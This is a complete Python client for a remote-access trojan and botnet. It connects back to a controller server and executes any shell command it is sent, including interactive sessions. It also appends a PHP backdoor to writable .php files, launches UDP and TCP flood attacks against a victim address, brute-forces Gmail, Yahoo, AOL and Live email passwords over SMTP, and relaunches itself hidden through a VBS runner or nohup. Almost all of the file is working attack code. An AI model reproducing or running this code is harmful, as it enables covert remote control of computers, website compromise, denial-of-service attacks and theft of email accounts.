#!/usr/bin/env python3

# MIT License
##
# Copyright (c) 2017 Sayak Brahmachari
##
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to
# deal in the Software without restriction, including without limitation the
# rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
# sell copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
##
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
##
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
# IN THE SOFTWARE.

import subprocess
import os
import sys
import time
import threading
import smtplib
import random
import fnmatch
import tempfile
import socket
import re
import multiprocessing

if len(sys.argv) == 3:
    host = sys.argv[1]
    port = int(sys.argv[2])
else:
    # Comment the below line and uncomment the next two for a pre-packaged client.
    #sys.exit("Usage: client.py <server ip> <server port>")
    print("Usage: client.py <server ip> <server port>")
    host = '127.0.0.1'
    port = 9999
    print("Using default values - {}:{}".format(host, port))

frozen = getattr(sys, 'frozen', False)


def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(os.path.dirname(__file__))

    return os.path.join(base_path, relative_path)


temporary = open(resource_path('selfUpdate.py'), mode='r').read()\
    .format(pid=os.getpid(), frozen=frozen, host=host,
            port=port, exe=sys.executable, arg=sys.argv[0])
backdoor = open(resource_path('backdoor.php'), mode='r').read()\
    % (host, port, sys.executable, sys.argv[0], host, port)

# Bruteforce Helper funcs


def product(*args, **kwds):
    pools = list(map(tuple, args)) * kwds.get('repeat', 1)
    result = [[]]
    for pool in pools:
        result = [x+[y] for x in result for y in pool]
    for prod in result:
        yield tuple(prod)


def repeat(obj, times=None):
    if times is None:
        while True:
            yield obj
    else:
        for _ in range(times):
            yield obj
# Bruteforce Helper funcs END


def selfUpdate():
    filename = str(random.randint(1, 1000))

    with open(filename+'.py', "w") as f:
        f.write(temporary)

    if sys.platform == "win32":
        runner = 'CreateObject("WScript.Shell").Run WScript.Arguments(0), 0'
        with open(tempfile.gettempdir() + "/runner.vbs", "w") as f:
            f.write(runner)
        if frozen:
            multiprocessing.Process(target=__import__, args=(filename,))
        else:
            os.system(tempfile.gettempdir() + '/runner.vbs "{exe} {arg} {host} {port}"'
                      .format(host=host, port=port, exe=sys.executable, arg=filename+'.py'))
    else:
        os.system("nohup {exe} {arg} {host} {port} > /dev/null 2>&1 &"
                  .format(host=host, port=port, exe=sys.executable, arg=sys.argv[0]))


def send_msg(sock, proc, sem):
    while True:
        if sem.acquire(False):
            return
        sock.send(proc.stdout.read(1))


def recv_msg(sock, proc, sem):
    while True:
        if sem.acquire(False):
            return
        data = sock.recv(20480)
        if len(data) > 0:
            proc.stdin.write(data)


def find_files(directory, pattern):
    for root, _, files in os.walk(directory):
        for basename in files:
            if fnmatch.fnmatch(basename, pattern):
                filename = os.path.join(root, basename)
                yield filename


def debackdoor(thedir):
    allphp = find_files(thedir, '*.php')

    for thefile in allphp:
        if (os.access(thefile, os.R_OK)) and (os.access(thefile, os.W_OK)):
            f = open(thefile, "r")
            inside = f.read()
            f.close()

            if "#WARNING: Clean base64id: 55a1983" not in inside:
                alllines = inside.split('\n')
                if alllines[len(alllines)-1] != "?>":
                    global backdoor
                    backdoor = "?>\n%s" % backdoor

                f = open(thefile, "a")
                f.write(backdoor)
                f.close()


def rmbackdoor(thedir):
    allphp = find_files(thedir, '*.php')

    for thefile in allphp:
        if (os.access(thefile, os.R_OK)) and (os.access(thefile, os.W_OK)):
            f = open(thefile, "r")
            inside = f.read()
            f.close()

            if "#WARNING: Clean base64id: 55a1983" in inside:
                inside = inside.replace(backdoor, "")
                f = open(thefile, "w")
                f.write(inside)
                f.close()


def savePass(password):
    f = open("password.txt", "w")
    f.write(password)
    f.close()


def gmailbruteforce(email, combination, minimum, maximum):
    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
    smtpserver.starttls()
    smtpserver.ehlo()

    found = False

    for n in range(minimum, maximum+1):
        if not found:
            for w in product(combination, repeat=n):
                password = ''.join(w)
                try:
                    smtpserver.login(email, password)
                except(smtplib.SMTPAuthenticationError) as msg:
                    if "Please Log" in str(msg):
                        savePass(password)
                        found = True
                        break
        else:
            break


def popularbruteforce(cmd):
    bruteinfo = cmd[1].split(":")
    if cmd[0] == "yahoobruteforce":
        server = "smtp.mail.yahoo.com"
    elif cmd[0] == "livebruteforce":
        server = "stmp.aol.com"
    elif cmd[0] == "aolbruteforce":
        server = "smtp.live.com"
    t = threading.Thread(None, custombruteforce, None, (server, 587, bruteinfo[0], bruteinfo[1],
                                                        bruteinfo[2], bruteinfo[3]))
    t.start()


def custombruteforce(address, smtpport, email, combination, minimum, maximum):
    smtpserver = smtplib.SMTP(address, int(smtpport))
    smtpserver.starttls()
    smtpserver.ehlo()

    found = False

    for n in range(minimum, maximum+1):
        if not found:
            for w in product(combination, repeat=n):
                password = ''.join(w)
                try:
                    smtpserver.login(email, password)
                    savePass(password)
                    found = True
                    break
                except:
                    pass
        else:
            break


class udpFlood(threading.Thread):
    def __init__(self, victimip, victimport):
        threading.Thread.__init__(self)
        self.victimip = victimip
        self.victimport = victimport

    def run(self):
        timeout = time.time() + 60
        while True:
            if time.time() <= timeout:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect((self.victimip, int(self.victimport)))
                tmp = 'A' * 65000
                s.send(bytes(tmp, 'utf-8'))
            else:
                break


class tcpFlood(threading.Thread):
    def __init__(self, victimip, victimport):
        threading.Thread.__init__(self)
        self.victimip = victimip
        self.victimport = victimport

    def run(self):
        timeout = time.time() + 60
        while True:
            if time.time() <= timeout:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.victimip, int(self.victimport)))
                tmp = 'A' * 65000
                s.send(bytes(tmp, 'utf-8'))
            else:
                break


def udpUnleach(victimip, victimport):
    threads = []
    for _ in range(1, 21):
        thread = udpFlood(victimip, victimport)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()


def tcpUnleach(victimip, victimport):
    threads = []
    for _ in range(1, 21):
        thread = tcpFlood(victimip, victimport)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()


def interact(s, command):
    commands = command.split()
    if len(commands) == 0:
        return
    if commands[0] == "cd":
        try:
            os.chdir(commands[1])
            s.send(bytes(os.getcwd(), 'utf-8'))
            print("[INFO] Changed dir to %s" % os.getcwd())
        except FileNotFoundError:
            s.send(bytes('[CLIENT - ERROR] Directory missing\n'
                         + commands[1], 'utf-8'))
            print("[INFO] %s directory not found" % os.getcwd())
    elif commands[0] in ["selfupdateall", "selfupdate"]:
        selfUpdate()
        return None
    elif commands[0] == "setbackdoor":
        try:
            debackdoor(commands[1])
            s.send(bytes("[CLIENT] Backdoored\n", 'utf-8'))
        except:
            s.send(bytes("[CLIENT] Wrong arguments\n",
                         'utf-8'))
    elif commands[0] == "rmbackdoor":
        try:
            rmbackdoor(commands[1])
            s.send(bytes("[CLIENT] Malicious PHP Removed\n",
                         'utf-8'))
        except:
            s.send(bytes("[CLIENT] Wrong arguments\n",
                         'utf-8'))
    elif commands[0] == "udpflood":
        try:
            udpinfo = commands[1].split(":")
            t = threading.Thread(None, udpUnleach, None,
                                 (udpinfo[0], udpinfo[1]))
            t.start()
            s.send(bytes("[CLIENT] Flooding started\n",
                         'utf-8'))
        except:
            s.send(bytes("[CLIENT] Failed to start Flooding\n",
                         'utf-8'))
            pass
    elif commands[0] == "udpfloodall":
        try:
            udpinfo = commands[1].split(":")
            t = threading.Thread(None, udpUnleach, None,
                                 (udpinfo[0], udpinfo[1]))
            t.start()
        except:
            pass
    elif commands[0] == "tcpflood":
        try:
            tcpinfo = commands[1].split(":")
            t = threading.Thread(None, tcpUnleach, None, (tcpinfo[0],
                                                          tcpinfo[1]))
            t.start()
            s.send(bytes("[INFO] Flooding started\n",
                         'utf-8'))
        except:
            s.send(bytes("[ERROR] Failed to start Flooding\n",
                         'utf-8'))
    elif commands[0] == "tcpfloodall":
        try:
            tcpinfo = commands[1].split(":")
            t = threading.Thread(None, tcpUnleach, None,
                                 (tcpinfo[0], tcpinfo[1]))
            t.start()
        except:
            pass
    elif commands[0] == "gmailbruteforce":
        try:
            bruteinfo = commands[1].split(":")
            t = threading.Thread(None, gmailbruteforce, None,
                                 (bruteinfo[0], bruteinfo[1],
                                  bruteinfo[2], bruteinfo[3]))
            t.start()
            s.send(bytes("[CLIENT] Bruteforcing started\n",
                         'utf-8'))
        except:
            s.send(bytes("[CLIENT] Wrong arguments\n",
                         'utf-8'))
    elif commands[0] in ["yahoobruteforce", "livebruteforce", "aolbruteforce"]:
        try:
            popularbruteforce(commands)
            s.send(bytes("[CLIENT] Bruteforcing started\n",
                         'utf-8'))
        except:
            s.send(bytes("[CLIENT] Wrong arguments\n",
                         'utf-8'))
    elif commands[0] == "custombruteforce":
        try:
            bruteinfo = commands[1].split(":")
            t = threading.Thread(None, custombruteforce, None,
                                 (bruteinfo[0], bruteinfo[1],
                                  bruteinfo[2], bruteinfo[3],
                                  bruteinfo[4], bruteinfo[5]))
            t.start()
            s.send(bytes("[CLIENT] Bruteforcing started\n",
                         'utf-8'))
        except:
            s.send(bytes("[CLIENT] Wrong arguments\n",
                         'utf-8'))
    elif commands[0] == "hellows123":
        s.send(bytes(os.getcwd(), 'utf-8'))
    elif commands[0] == "quit":
        s.close()
        print("[INFO] Connection Closed")
        return True
    elif commands[0] == "rawexec":
        try:
            s.send(bytes("[INFO] Spawning {}\n".format(commands[1]), 'utf-8'))
            sem1 = threading.Semaphore()
            sem2 = threading.Semaphore()
            sem1.acquire(False)
            sem2.acquire(False)
            p = subprocess.Popen(' '.join(commands[1:]), shell=True,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT,
                                stdin=subprocess.PIPE)
            sender = threading.Thread(target=send_msg, args=(s, p, sem1,))
            recver = threading.Thread(target=recv_msg, args=(s, p, sem2,))
            sender.daemon = True
            recver.daemon = True
            sender.start()
            recver.start()
            p.wait()
            sem1.release()
            sem2.release()
            while threading.active_count() > 1:
                pass
            s.send(bytes('stop', 'utf-8'))
        except Exception as ex:
            s.send(bytes('stop', 'utf-8'))
            time.sleep(1)
            s.send(bytes("[CLIENT] Error - {}\n".format(ex), 'utf-8'))
    else:
        thecommand = ' '.join(commands)
        pipe = subprocess.PIPE
        comm = subprocess.Popen(thecommand, shell=True,
                                stdout=pipe, stderr=pipe,
                                stdin=pipe)
        try:
            STDOUT, STDERR = comm.communicate(timeout=30)
            en_STDERR = STDERR.decode()
            en_STDOUT = STDOUT.decode()
            if en_STDERR == "":
                if en_STDOUT != "":
                    print(en_STDOUT)
                    s.send(bytes(en_STDOUT, 'utf-8'))
                else:
                    s.send(bytes("[CLIENT] Command Executed",
                                 'utf-8'))
            else:
                print(en_STDERR)
                s.send(bytes(en_STDERR, 'utf-8'))
        except subprocess.TimeoutExpired:
            comm.terminate()
            comm.kill()
            s.send(bytes("[CLIENT] Command Timed Out\n",
                         'utf-8'))
            STDOUT, STDERR = comm.communicate()
            en_STDERR = STDERR.decode()
            en_STDOUT = STDOUT.decode()
            if en_STDERR == "":
                if en_STDOUT != "":
                    print(en_STDOUT)
                    s.send(bytes(en_STDOUT, 'utf-8'))


def main(host, port):
    while True:
        connected = False
        while True:
            while not connected:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((host, port))
                    print("[INFO] Connected")
                    connected = True
                except:
                    time.sleep(5)

            try:
                msg = s.recv(20480).decode()
                print(msg)
                allofem = re.split(''';(?=(?:[^'"]|'[^']*'|"[^"]*")*$)''', msg)
                for onebyone in allofem:
                    if interact(s, onebyone):
                        break
            except KeyboardInterrupt:
                s.close()
                print("[INFO] Connection Closed")
                break
            except Exception as ex:
                s.close()
                print("[INFO] Connection Closed Due to Error:", ex,
                      "\n", __import__('traceback').print_exc())
                break


if __name__ == '__main__':
    while True:
        try:
            main(host, port)
        except:
            time.sleep(5)
